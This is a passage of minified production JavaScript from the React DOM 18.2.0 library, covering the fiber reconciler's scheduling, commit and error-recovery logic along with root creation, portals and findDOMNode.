if(t=a&-a,e.callbackPriority!==t){if(null!=n&&Xe(n),1===t)0===e.tag?function(e){Fi=!0,Wi(e)}(cc.bind(null,e)):Wi(cc.bind(null,e)),oi((function(){0===(6&Al)&&qi()})),n=null;else{switch(vt(a)){case 1:n=Ze;break;case 4:n=et;break;case 16:default:n=tt;break;case 536870912:n=at}n=jc(n,rc.bind(null,e))}e.callbackPriority=t,e.callbackNode=n}}function rc(e,t){if(Zl=-1,ec=0,0!==(6&Al))throw Error(r(327));var n=e.callbackNode;if(Sc()&&e.callbackNode!==n)return null;var a=pt(e,e===jl?Dl:0);if(0===a)return null;if(0!==(30&a)||0!==(a&e.expiredLanes)||t)t=yc(e,a);else{t=a;var i=Al;Al|=2;var o=mc();for(jl===e&&Dl===t||(Hl=null,Bl=Je()+500,hc(e,t));;)try{wc();break}catch(l){fc(e,l)}kr(),Pl.current=o,Al=i,null!==Ll?t=0:(jl=null,Dl=0,t=Ml)}if(0!==t){if(2===t&&(0!==(i=ft(e))&&(a=i,t=oc(e,i))),1===t)throw n=zl,hc(e,0),lc(e,a),ic(e,Je()),n;if(6===t)lc(e,a);else{if(i=e.current.alternate,0===(30&a)&&!function(e){for(var t=e;;){if(16384&t.flags){var n=t.updateQueue;if(null!==n&&null!==(n=n.stores))for(var a=0;a<n.length;a++){var i=n[a],r=i.getSnapshot;i=i.value;try{if(!sa(r(),i))return!1}catch(s){return!1}}}if(n=t.child,16384&t.subtreeFlags&&null!==n)n.return=t,t=n;else{if(t===e)break;for(;null===t.sibling;){if(null===t.return||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}(i)&&(2===(t=yc(e,a))&&(0!==(o=ft(e))&&(a=o,t=oc(e,o))),1===t))throw n=zl,hc(e,0),lc(e,a),ic(e,Je()),n;switch(e.finishedWork=i,e.finishedLanes=a,t){case 0:case 1:throw Error(r(345));case 2:case 5:xc(e,Wl,Hl);break;case 3:if(lc(e,a),(130023424&a)===a&&10<(t=ql+500-Je())){if(0!==pt(e,0))break;if(((i=e.suspendedLanes)&a)!==a){tc(),e.pingedLanes|=e.suspendedLanes&i;break}e.timeoutHandle=ai(xc.bind(null,e,Wl,Hl),t);break}xc(e,Wl,Hl);break;case 4:if(lc(e,a),(4194240&a)===a)break;for(t=e.eventTimes,i=-1;0<a;){var s=31-ot(a);o=1<<s,(s=t[s])>i&&(i=s),a&=~o}if(a=i,10<(a=(120>(a=Je()-a)?120:480>a?480:1080>a?1080:1920>a?1920:3e3>a?3e3:4320>a?4320:1960*El(a/1960))-a)){e.timeoutHandle=ai(xc.bind(null,e,Wl,Hl),a);break}xc(e,Wl,Hl);break;default:throw Error(r(329))}}}return ic(e,Je()),e.callbackNode===n?rc.bind(null,e):null}function oc(e,t){var n=Ul;return e.current.memoizedState.isDehydrated&&(hc(e,t).flags|=256),2!==(e=yc(e,t))&&(t=Wl,Wl=n,null!==t&&sc(t)),e}function sc(e){null===Wl?Wl=e:Wl.push.apply(Wl,e)}function lc(e,t){for(t&=~Fl,t&=~_l,e.suspendedLanes|=t,e.pingedLanes&=~t,e=e.expirationTimes;0<t;){var n=31-ot(t),a=1<<n;e[n]=-1,t&=~a}}function cc(e){if(0!==(6&Al))throw Error(r(327));Sc();var t=pt(e,0);if(0===(1&t))return ic(e,Je()),null;var n=yc(e,t);if(0!==e.tag&&2===n){var a=ft(e);0!==a&&(t=a,n=oc(e,a))}if(1===n)throw n=zl,hc(e,0),lc(e,t),ic(e,Je()),n;if(6===n)throw Error(r(345));return e.finishedWork=e.current.alternate,e.finishedLanes=t,xc(e,Wl,Hl),ic(e,Je()),null}function uc(e,t){var n=Al;Al|=1;try{return e(t)}finally{0===(Al=n)&&(Bl=Je()+500,Fi&&qi())}}function dc(e){null!==Ql&&0===Ql.tag&&0===(6&Al)&&Sc();var t=Al;Al|=1;var n=Cl.transition,a=wt;try{if(Cl.transition=null,wt=1,e)return e()}finally{wt=a,Cl.transition=n,0===(6&(Al=t))&&qi()}}function pc(){Nl=Rl.current,Ei(Rl)}function hc(e,t){e.finishedWork=null,e.finishedLanes=0;var n=e.timeoutHandle;if(-1!==n&&(e.timeoutHandle=-1,ii(n)),null!==Ll)for(n=Ll.return;null!==n;){var a=n;switch(tr(a),a.tag){case 1:null!==(a=a.type.childContextTypes)&&void 0!==a&&Ni();break;case 3:io(),Ei(Ai),Ei(Ci),uo();break;case 5:oo(a);break;case 4:io();break;case 13:case 19:Ei(so);break;case 10:xr(a.type._context);break;case 22:case 23:pc()}n=n.return}if(jl=e,Ll=e=Rc(e.current,null),Dl=Nl=t,Ml=0,zl=null,Fl=_l=Ol=0,Wl=Ul=null,null!==Pr){for(t=0;t<Pr.length;t++)if(null!==(a=(n=Pr[t]).interleaved)){n.interleaved=null;var i=a.next,r=n.pending;if(null!==r){var o=r.next;r.next=i,a.next=o}n.pending=a}Pr=null}return e}function fc(e,t){for(;;){var n=Ll;try{if(kr(),po.current=os,bo){for(var a=mo.memoizedState;null!==a;){var i=a.queue;null!==i&&(i.pending=null),a=a.next}bo=!1}if(fo=0,yo=go=mo=null,wo=!1,vo=0,Tl.current=null,null===n||null===n.return){Ml=1,zl=t,Ll=null;break}e:{var o=e,s=n.return,l=n,c=t;if(t=Dl,l.flags|=32768,null!==c&&"object"===typeof c&&"function"===typeof c.then){var u=c,d=l,p=d.tag;if(0===(1&d.mode)&&(0===p||11===p||15===p)){var h=d.alternate;h?(d.updateQueue=h.updateQueue,d.memoizedState=h.memoizedState,d.lanes=h.lanes):(d.updateQueue=null,d.memoizedState=null)}var f=ys(s);if(null!==f){f.flags&=-257,bs(f,s,l,0,t),1&f.mode&&gs(o,u,t),c=u;var m=(t=f).updateQueue;if(null===m){var g=new Set;g.add(c),t.updateQueue=g}else m.add(c);break e}if(0===(1&t)){gs(o,u,t),gc();break e}c=Error(r(426))}else if(ir&&1&l.mode){var y=ys(s);if(null!==y){0===(65536&y.flags)&&(y.flags|=256),bs(y,s,l,0,t),fr(us(c,l));break e}}o=c=us(c,l),4!==Ml&&(Ml=2),null===Ul?Ul=[o]:Ul.push(o),o=s;do{switch(o.tag){case 3:o.flags|=65536,t&=-t,o.lanes|=t,zr(o,fs(0,c,t));break e;case 1:l=c;var b=o.type,w=o.stateNode;if(0===(128&o.flags)&&("function"===typeof b.getDerivedStateFromError||null!==w&&"function"===typeof w.componentDidCatch&&(null===Gl||!Gl.has(w)))){o.flags|=65536,t&=-t,o.lanes|=t,zr(o,ms(o,l,t));break e}}o=o.return}while(null!==o)}kc(n)}catch(v){t=v,Ll===n&&null!==n&&(Ll=n=n.return);continue}break}}function mc(){var e=Pl.current;return Pl.current=os,null===e?os:e}function gc(){0!==Ml&&3!==Ml&&2!==Ml||(Ml=4),null===jl||0===(268435455&Ol)&&0===(268435455&_l)||lc(jl,Dl)}function yc(e,t){var n=Al;Al|=2;var a=mc();for(jl===e&&Dl===t||(Hl=null,hc(e,t));;)try{bc();break}catch(i){fc(e,i)}if(kr(),Al=n,Pl.current=a,null!==Ll)throw Error(r(261));return jl=null,Dl=0,Ml}function bc(){for(;null!==Ll;)vc(Ll)}function wc(){for(;null!==Ll&&!Qe();)vc(Ll)}function vc(e){var t=Il(e.alternate,e,Nl);e.memoizedProps=e.pendingProps,null===t?kc(e):Ll=t,Tl.current=null}function kc(e){var t=e;do{var n=t.alternate;if(e=t.return,0===(32768&t.flags)){if(null!==(n=Xs(n,t,Nl)))return void(Ll=n)}else{if(null!==(n=Qs(n,t)))return n.flags&=32767,void(Ll=n);if(null===e)return Ml=6,void(Ll=null);e.flags|=32768,e.subtreeFlags=0,e.deletions=null}if(null!==(t=t.sibling))return void(Ll=t);Ll=t=e}while(null!==t);0===Ml&&(Ml=5)}function xc(e,t,n){var a=wt,i=Cl.transition;try{Cl.transition=null,wt=1,function(e,t,n,a){do{Sc()}while(null!==Ql);if(0!==(6&Al))throw Error(r(327));n=e.finishedWork;var i=e.finishedLanes;if(null===n)return null;if(e.finishedWork=null,e.finishedLanes=0,n===e.current)throw Error(r(177));e.callbackNode=null,e.callbackPriority=0;var o=n.lanes|n.childLanes;if(function(e,t){var n=e.pendingLanes&~t;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=t,e.mutableReadLanes&=t,e.entangledLanes&=t,t=e.entanglements;var a=e.eventTimes;for(e=e.expirationTimes;0<n;){var i=31-ot(n),r=1<<i;t[i]=0,a[i]=-1,e[i]=-1,n&=~r}}(e,o),e===jl&&(Ll=jl=null,Dl=0),0===(2064&n.subtreeFlags)&&0===(2064&n.flags)||Xl||(Xl=!0,jc(tt,(function(){return Sc(),null}))),o=0!==(15990&n.flags),0!==(15990&n.subtreeFlags)||o){o=Cl.transition,Cl.transition=null;var s=wt;wt=1;var l=Al;Al|=4,Tl.current=null,function(e,t){if(ei=Ht,ha(e=pa())){if("selectionStart"in e)var n={start:e.selectionStart,end:e.selectionEnd};else e:{var a=(n=(n=e.ownerDocument)&&n.defaultView||window).getSelection&&n.getSelection();if(a&&0!==a.rangeCount){n=a.anchorNode;var i=a.anchorOffset,o=a.focusNode;a=a.focusOffset;try{n.nodeType,o.nodeType}catch(k){n=null;break e}var s=0,l=-1,c=-1,u=0,d=0,p=e,h=null;t:for(;;){for(var f;p!==n||0!==i&&3!==p.nodeType||(l=s+i),p!==o||0!==a&&3!==p.nodeType||(c=s+a),3===p.nodeType&&(s+=p.nodeValue.length),null!==(f=p.firstChild);)h=p,p=f;for(;;){if(p===e)break t;if(h===n&&++u===i&&(l=s),h===o&&++d===a&&(c=s),null!==(f=p.nextSibling))break;h=(p=h).parentNode}p=f}n=-1===l||-1===c?null:{start:l,end:c}}else n=null}n=n||{start:0,end:0}}else n=null;for(ti={focusedElem:e,selectionRange:n},Ht=!1,Zs=t;null!==Zs;)if(e=(t=Zs).child,0!==(1028&t.subtreeFlags)&&null!==e)e.return=t,Zs=e;else for(;null!==Zs;){t=Zs;try{var m=t.alternate;if(0!==(1024&t.flags))switch(t.tag){case 0:case 11:case 15:case 5:case 6:case 4:case 17:break;case 1:if(null!==m){var g=m.memoizedProps,y=m.memoizedState,b=t.stateNode,w=b.getSnapshotBeforeUpdate(t.elementType===t.type?g:gr(t.type,g),y);b.__reactInternalSnapshotBeforeUpdate=w}break;case 3:var v=t.stateNode.containerInfo;1===v.nodeType?v.textContent="":9===v.nodeType&&v.documentElement&&v.removeChild(v.documentElement);break;default:throw Error(r(163))}}catch(k){Ec(t,t.return,k)}if(null!==(e=t.sibling)){e.return=t.return,Zs=e;break}Zs=t.return}m=nl,nl=!1}(e,n),yl(n,e),fa(ti),Ht=!!ei,ti=ei=null,e.current=n,wl(n,e,i),Ye(),Al=l,wt=s,Cl.transition=o}else e.current=n;if(Xl&&(Xl=!1,Ql=e,Yl=i),o=e.pendingLanes,0===o&&(Gl=null),function(e){if(rt&&"function"===typeof rt.onCommitFiberRoot)try{rt.onCommitFiberRoot(it,e,void 0,128===(128&e.current.flags))}catch(t){}}(n.stateNode),ic(e,Je()),null!==t)for(a=e.onRecoverableError,n=0;n<t.length;n++)i=t[n],a(i.value,{componentStack:i.stack,digest:i.digest});if(Vl)throw Vl=!1,e=$l,$l=null,e;0!==(1&Yl)&&0!==e.tag&&Sc(),o=e.pendingLanes,0!==(1&o)?e===Kl?Jl++:(Jl=0,Kl=e):Jl=0,qi()}(e,t,n,a)}finally{Cl.transition=i,wt=a}return null}function Sc(){if(null!==Ql){var e=vt(Yl),t=Cl.transition,n=wt;try{if(Cl.transition=null,wt=16>e?16:e,null===Ql)var a=!1;else{if(e=Ql,Ql=null,Yl=0,0!==(6&Al))throw Error(r(331));var i=Al;for(Al|=4,Zs=e.current;null!==Zs;){var o=Zs,s=o.child;if(0!==(16&Zs.flags)){var l=o.deletions;if(null!==l){for(var c=0;c<l.length;c++){var u=l[c];for(Zs=u;null!==Zs;){var d=Zs;switch(d.tag){case 0:case 11:case 15:al(8,d,o)}var p=d.child;if(null!==p)p.return=d,Zs=p;else for(;null!==Zs;){var h=(d=Zs).sibling,f=d.return;if(ol(d),d===u){Zs=null;break}if(null!==h){h.return=f,Zs=h;break}Zs=f}}}var m=o.alternate;if(null!==m){var g=m.child;if(null!==g){m.child=null;do{var y=g.sibling;g.sibling=null,g=y}while(null!==g)}}Zs=o}}if(0!==(2064&o.subtreeFlags)&&null!==s)s.return=o,Zs=s;else e:for(;null!==Zs;){if(0!==(2048&(o=Zs).flags))switch(o.tag){case 0:case 11:case 15:al(9,o,o.return)}var b=o.sibling;if(null!==b){b.return=o.return,Zs=b;break e}Zs=o.return}}var w=e.current;for(Zs=w;null!==Zs;){var v=(s=Zs).child;if(0!==(2064&s.subtreeFlags)&&null!==v)v.return=s,Zs=v;else e:for(s=w;null!==Zs;){if(0!==(2048&(l=Zs).flags))try{switch(l.tag){case 0:case 11:case 15:il(9,l)}}catch(x){Ec(l,l.return,x)}if(l===s){Zs=null;break e}var k=l.sibling;if(null!==k){k.return=l.return,Zs=k;break e}Zs=l.return}}if(Al=i,qi(),rt&&"function"===typeof rt.onPostCommitFiberRoot)try{rt.onPostCommitFiberRoot(it,e)}catch(x){}a=!0}return a}finally{wt=n,Cl.transition=t}}return!1}function Ic(e,t,n){e=Rr(e,t=fs(0,t=us(n,t),1),1),t=tc(),null!==e&&(yt(e,1,t),ic(e,t))}function Ec(e,t,n){if(3===e.tag)Ic(e,e,n);else for(;null!==t;){if(3===t.tag){Ic(t,e,n);break}if(1===t.tag){var a=t.stateNode;if("function"===typeof t.type.getDerivedStateFromError||"function"===typeof a.componentDidCatch&&(null===Gl||!Gl.has(a))){t=Rr(t,e=ms(t,e=us(n,e),1),1),e=tc(),null!==t&&(yt(t,1,e),ic(t,e));break}}t=t.return}}function Pc(e,t,n){var a=e.pingCache;null!==a&&a.delete(t),t=tc(),e.pingedLanes|=e.suspendedLanes&n,jl===e&&(Dl&n)===n&&(4===Ml||3===Ml&&(130023424&Dl)===Dl&&500>Je()-ql?hc(e,0):Fl|=n),ic(e,t)}function Tc(e,t){0===t&&(0===(1&e.mode)?t=1:(t=ut,0===(130023424&(ut<<=1))&&(ut=4194304)));var n=tc();null!==(e=Ar(e,t))&&(yt(e,t,n),ic(e,n))}function Cc(e){var t=e.memoizedState,n=0;null!==t&&(n=t.retryLane),Tc(e,n)}function Ac(e,t){var n=0;switch(e.tag){case 13:var a=e.stateNode,i=e.memoizedState;null!==i&&(n=i.retryLane);break;case 19:a=e.stateNode;break;default:throw Error(r(314))}null!==a&&a.delete(t),Tc(e,n)}function jc(e,t){return Ge(e,t)}function Lc(e,t,n,a){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=a,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Dc(e,t,n,a){return new Lc(e,t,n,a)}function Nc(e){return!(!(e=e.prototype)||!e.isReactComponent)}function Rc(e,t){var n=e.alternate;return null===n?((n=Dc(e.tag,t,e.key,e.mode)).elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.type=e.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=14680064&e.flags,n.childLanes=e.childLanes,n.lanes=e.lanes,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=null===t?null:{lanes:t.lanes,firstContext:t.firstContext},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n}function Mc(e,t,n,a,i,o){var s=2;if(a=e,"function"===typeof e)Nc(e)&&(s=1);else if("string"===typeof e)s=5;else e:switch(e){case S:return zc(n.children,i,o,t);case I:s=8,i|=8;break;case E:return(e=Dc(12,n,t,2|i)).elementType=E,e.lanes=o,e;case A:return(e=Dc(13,n,t,i)).elementType=A,e.lanes=o,e;case j:return(e=Dc(19,n,t,i)).elementType=j,e.lanes=o,e;case N:return Oc(n,i,o,t);default:if("object"===typeof e&&null!==e)switch(e.$$typeof){case P:s=10;break e;case T:s=9;break e;case C:s=11;break e;case L:s=14;break e;case D:s=16,a=null;break e}throw Error(r(130,null==e?e:typeof e,""))}return(t=Dc(s,n,t,i)).elementType=e,t.type=a,t.lanes=o,t}function zc(e,t,n,a){return(e=Dc(7,e,a,t)).lanes=n,e}function Oc(e,t,n,a){return(e=Dc(22,e,a,t)).elementType=N,e.lanes=n,e.stateNode={isHidden:!1},e}function _c(e,t,n){return(e=Dc(6,e,null,t)).lanes=n,e}function Fc(e,t,n){return(t=Dc(4,null!==e.children?e.children:[],e.key,t)).lanes=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function Uc(e,t,n,a,i){this.tag=t,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=gt(0),this.expirationTimes=gt(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=gt(0),this.identifierPrefix=a,this.onRecoverableError=i,this.mutableSourceEagerHydrationData=null}function Wc(e,t,n,a,i,r,o,s,l){return e=new Uc(e,t,n,s,l),1===t?(t=1,!0===r&&(t|=8)):t=0,r=Dc(3,null,null,t),e.current=r,r.stateNode=e,r.memoizedState={element:a,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},Lr(r),e}function qc(e){if(!e)return Ti;e:{if(qe(e=e._reactInternals)!==e||1!==e.tag)throw Error(r(170));var t=e;do{switch(t.tag){case 3:t=t.stateNode.context;break e;case 1:if(Di(t.type)){t=t.stateNode.__reactInternalMemoizedMergedChildContext;break e}}t=t.return}while(null!==t);throw Error(r(171))}if(1===e.tag){var n=e.type;if(Di(n))return Mi(e,n,t)}return t}function Bc(e,t,n,a,i,r,o,s,l){return(e=Wc(n,a,!0,e,0,r,0,s,l)).context=qc(null),n=e.current,(r=Nr(a=tc(),i=nc(n))).callback=void 0!==t&&null!==t?t:null,Rr(n,r,i),e.current.lanes=i,yt(e,i,a),ic(e,a),e}function Hc(e,t,n,a){var i=t.current,r=tc(),o=nc(i);return n=qc(n),null===t.context?t.context=n:t.pendingContext=n,(t=Nr(r,o)).payload={element:e},null!==(a=void 0===a?null:a)&&(t.callback=a),null!==(e=Rr(i,t,o))&&(ac(e,i,o,r),Mr(e,i,o)),o}function Vc(e){return(e=e.current).child?(e.child.tag,e.child.stateNode):null}function $c(e,t){if(null!==(e=e.memoizedState)&&null!==e.dehydrated){var n=e.retryLane;e.retryLane=0!==n&&n<t?n:t}}function Gc(e,t){$c(e,t),(e=e.alternate)&&$c(e,t)}Il=function(e,t,n){if(null!==e)if(e.memoizedProps!==t.pendingProps||Ai.current)vs=!0;else{if(0===(e.lanes&n)&&0===(128&t.flags))return vs=!1,function(e,t,n){switch(t.tag){case 3:js(t),hr();break;case 5:ro(t);break;case 1:Di(t.type)&&zi(t);break;case 4:ao(t,t.stateNode.containerInfo);break;case 10:var a=t.type._context,i=t.memoizedProps.value;Pi(yr,a._currentValue),a._currentValue=i;break;case 13:if(null!==(a=t.memoizedState))return null!==a.dehydrated?(Pi(so,1&so.current),t.flags|=128,null):0!==(n&t.child.childLanes)?_s(e,t,n):(Pi(so,1&so.current),null!==(e=Vs(e,t,n))?e.sibling:null);Pi(so,1&so.current);break;case 19:if(a=0!==(n&t.childLanes),0!==(128&e.flags)){if(a)return Bs(e,t,n);t.flags|=128}if(null!==(i=t.memoizedState)&&(i.rendering=null,i.tail=null,i.lastEffect=null),Pi(so,so.current),a)break;return null;case 22:case 23:return t.lanes=0,Es(e,t,n)}return Vs(e,t,n)}(e,t,n);vs=0!==(131072&e.flags)}else vs=!1,ir&&0!==(1048576&t.flags)&&Zi(t,$i,t.index);switch(t.lanes=0,t.tag){case 2:var a=t.type;Hs(e,t),e=t.pendingProps;var i=Li(t,Ci.current);Ir(t,n),i=Io(null,t,a,e,i,n);var o=Eo();return t.flags|=1,"object"===typeof i&&null!==i&&"function"===typeof i.render&&void 0===i.$$typeof?(t.tag=1,t.memoizedState=null,t.updateQueue=null,Di(a)?(o=!0,zi(t)):o=!1,t.memoizedState=null!==i.state&&void 0!==i.state?i.state:null,Lr(t),i.updater=Wr,t.stateNode=i,i._reactInternals=t,Vr(t,a,e,n),t=As(null,t,a,!0,o,n)):(t.tag=0,ir&&o&&er(t),ks(null,t,i,n),t=t.child),t;case 16:a=t.elementType;e:{switch(Hs(e,t),e=t.pendingProps,a=(i=a._init)(a._payload),t.type=a,i=t.tag=function(e){if("function"===typeof e)return Nc(e)?1:0;if(void 0!==e&&null!==e){if((e=e.$$typeof)===C)return 11;if(e===L)return 14}return 2}(a),e=gr(a,e),i){case 0:t=Ts(null,t,a,e,n);break e;case 1:t=Cs(null,t,a,e,n);break e;case 11:t=xs(null,t,a,e,n);break e;case 14:t=Ss(null,t,a,gr(a.type,e),n);break e}throw Error(r(306,a,""))}return t;case 0:return a=t.type,i=t.pendingProps,Ts(e,t,a,i=t.elementType===a?i:gr(a,i),n);case 1:return a=t.type,i=t.pendingProps,Cs(e,t,a,i=t.elementType===a?i:gr(a,i),n);case 3:e:{if(js(t),null===e)throw Error(r(387));a=t.pendingProps,i=(o=t.memoizedState).element,Dr(e,t),Or(t,a,null,n);var s=t.memoizedState;if(a=s.element,o.isDehydrated){if(o={element:a,isDehydrated:!1,cache:s.cache,pendingSuspenseBoundaries:s.pendingSuspenseBoundaries,transitions:s.transitions},t.updateQueue.baseState=o,t.memoizedState=o,256&t.flags){t=Ls(e,t,a,n,i=us(Error(r(423)),t));break e}if(a!==i){t=Ls(e,t,a,n,i=us(Error(r(424)),t));break e}for(ar=ci(t.stateNode.containerInfo.firstChild),nr=t,ir=!0,rr=null,n=Jr(t,null,a,n),t.child=n;n;)n.flags=-3&n.flags|4096,n=n.sibling}else{if(hr(),a===i){t=Vs(e,t,n);break e}ks(e,t,a,n)}t=t.child}return t;case 5:return ro(t),null===e&&cr(t),a=t.type,i=t.pendingProps,o=null!==e?e.memoizedProps:null,s=i.children,ni(a,i)?s=null:null!==o&&ni(a,o)&&(t.flags|=32),Ps(e,t),ks(e,t,s,n),t.child;case 6:return null===e&&cr(t),null;case 13:return _s(e,t,n);case 4:return ao(t,t.stateNode.containerInfo),a=t.pendingProps,null===e?t.child=Yr(t,null,a,n):ks(e,t,a,n),t.child;case 11:return a=t.type,i=t.pendingProps,xs(e,t,a,i=t.elementType===a?i:gr(a,i),n);case 7:return ks(e,t,t.pendingProps,n),t.child;case 8:case 12:return ks(e,t,t.pendingProps.children,n),t.child;case 10:e:{if(a=t.type._context,i=t.pendingProps,o=t.memoizedProps,s=i.value,Pi(yr,a._currentValue),a._currentValue=s,null!==o)if(sa(o.value,s)){if(o.children===i.children&&!Ai.current){t=Vs(e,t,n);break e}}else for(null!==(o=t.child)&&(o.return=t);null!==o;){var l=o.dependencies;if(null!==l){s=o.child;for(var c=l.firstContext;null!==c;){if(c.context===a){if(1===o.tag){(c=Nr(-1,n&-n)).tag=2;var u=o.updateQueue;if(null!==u){var d=(u=u.shared).pending;null===d?c.next=c:(c.next=d.next,d.next=c),u.pending=c}}o.lanes|=n,null!==(c=o.alternate)&&(c.lanes|=n),Sr(o.return,n,t),l.lanes|=n;break}c=c.next}}else if(10===o.tag)s=o.type===t.type?null:o.child;else if(18===o.tag){if(null===(s=o.return))throw Error(r(341));s.lanes|=n,null!==(l=s.alternate)&&(l.lanes|=n),Sr(s,n,t),s=o.sibling}else s=o.child;if(null!==s)s.return=o;else for(s=o;null!==s;){if(s===t){s=null;break}if(null!==(o=s.sibling)){o.return=s.return,s=o;break}s=s.return}o=s}ks(e,t,i.children,n),t=t.child}return t;case 9:return i=t.type,a=t.pendingProps.children,Ir(t,n),a=a(i=Er(i)),t.flags|=1,ks(e,t,a,n),t.child;case 14:return i=gr(a=t.type,t.pendingProps),Ss(e,t,a,i=gr(a.type,i),n);case 15:return Is(e,t,t.type,t.pendingProps,n);case 17:return a=t.type,i=t.pendingProps,i=t.elementType===a?i:gr(a,i),Hs(e,t),t.tag=1,Di(a)?(e=!0,zi(t)):e=!1,Ir(t,n),Br(t,a,i),Vr(t,a,i,n),As(null,t,a,!0,e,n);case 19:return Bs(e,t,n);case 22:return Es(e,t,n)}throw Error(r(156,t.tag))};var Xc="function"===typeof reportError?reportError:function(e){console.error(e)};function Qc(e){this._internalRoot=e}function Yc(e){this._internalRoot=e}function Jc(e){return!(!e||1!==e.nodeType&&9!==e.nodeType&&11!==e.nodeType)}function Kc(e){return!(!e||1!==e.nodeType&&9!==e.nodeType&&11!==e.nodeType&&(8!==e.nodeType||" react-mount-point-unstable "!==e.nodeValue))}function Zc(){}function eu(e,t,n,a,i){var r=n._reactRootContainer;if(r){var o=r;if("function"===typeof i){var s=i;i=function(){var e=Vc(o);s.call(e)}}Hc(t,o,e,i)}else o=function(e,t,n,a,i){if(i){if("function"===typeof a){var r=a;a=function(){var e=Vc(o);r.call(e)}}var o=Bc(t,a,e,0,null,!1,0,"",Zc);return e._reactRootContainer=o,e[fi]=o.current,qa(8===e.nodeType?e.parentNode:e),dc(),o}for(;i=e.lastChild;)e.removeChild(i);if("function"===typeof a){var s=a;a=function(){var e=Vc(l);s.call(e)}}var l=Wc(e,0,!1,null,0,!1,0,"",Zc);return e._reactRootContainer=l,e[fi]=l.current,qa(8===e.nodeType?e.parentNode:e),dc((function(){Hc(t,l,n,a)})),l}(n,t,e,i,a);return Vc(o)}Yc.prototype.render=Qc.prototype.render=function(e){var t=this._internalRoot;if(null===t)throw Error(r(409));Hc(e,t,null,null)},Yc.prototype.unmount=Qc.prototype.unmount=function(){var e=this._internalRoot;if(null!==e){this._internalRoot=null;var t=e.containerInfo;dc((function(){Hc(null,e,null,null)})),t[fi]=null}},Yc.prototype.unstable_scheduleHydration=function(e){if(e){var t=It();e={blockedOn:null,target:e,priority:t};for(var n=0;n<Nt.length&&0!==t&&t<Nt[n].priority;n++);Nt.splice(n,0,e),0===n&&Ot(e)}},kt=function(e){switch(e.tag){case 3:var t=e.stateNode;if(t.current.memoizedState.isDehydrated){var n=dt(t.pendingLanes);0!==n&&(bt(t,1|n),ic(t,Je()),0===(6&Al)&&(Bl=Je()+500,qi()))}break;case 13:dc((function(){var t=Ar(e,1);if(null!==t){var n=tc();ac(t,e,1,n)}})),Gc(e,1)}},xt=function(e){if(13===e.tag){var t=Ar(e,134217728);if(null!==t)ac(t,e,134217728,tc());Gc(e,134217728)}},St=function(e){if(13===e.tag){var t=nc(e),n=Ar(e,t);if(null!==n)ac(n,e,t,tc());Gc(e,t)}},It=function(){return wt},Et=function(e,t){var n=wt;try{return wt=e,t()}finally{wt=n}},xe=function(e,t,n){switch(t){case"input":if(K(e,n),t=n.name,"radio"===n.type&&null!=t){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<n.length;t++){var a=n[t];if(a!==e&&a.form===e.form){var i=ki(a);if(!i)throw Error(r(90));G(a),K(a,i)}}}break;case"textarea":re(e,n);break;case"select":null!=(t=n.value)&&ne(e,!!n.multiple,t,!1)}},Ce=uc,Ae=dc;var tu={usingClientEntryPoint:!1,Events:[wi,vi,ki,Pe,Te,uc]},nu={findFiberByHostInstance:bi,bundleType:0,version:"18.2.0",rendererPackageName:"react-dom"},au={bundleType:nu.bundleType,version:nu.version,rendererPackageName:nu.rendererPackageName,rendererConfig:nu.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:v.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return null===(e=Ve(e))?null:e.stateNode},findFiberByHostInstance:nu.findFiberByHostInstance||function(){return null},findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.2.0-next-9e3b772b8-20220608"};if("undefined"!==typeof __REACT_DEVTOOLS_GLOBAL_HOOK__){var iu=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!iu.isDisabled&&iu.supportsFiber)try{it=iu.inject(au),rt=iu}catch(ue){}}t.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=tu,t.createPortal=function(e,t){var n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:null;if(!Jc(t))throw Error(r(200));return function(e,t,n){var a=3<arguments.length&&void 0!==arguments[3]?arguments[3]:null;return{$$typeof:x,key:null==a?null:""+a,children:e,containerInfo:t,implementation:n}}(e,t,null,n)},t.createRoot=function(e,t){if(!Jc(e))throw Error(r(299));var n=!1,a="",i=Xc;return null!==t&&void 0!==t&&(!0===t.unstable_strictMode&&(n=!0),void 0!==t.identifierPrefix&&(a=t.identifierPrefix),void 0!==t.onRecoverableError&&(i=t.onRecoverableError)),t=Wc(e,1,!1,null,0,n,0,a,i),e[fi]=t.current,qa(8===e.nodeType?e.parentNode:e),new Qc(t)},t.findDOMNode=function(e){if(null==e)return null;if(1===e.nodeType)return e;var t=e._reactInternals;if(void 0===t){if("function"===typeof e.render)throw Error(r(188));throw e=Object.keys(e).join(","),Error(r(268,e))}return e=null===(e=Ve(t))?null:e.stateNode},t.flushSync=function(e){return 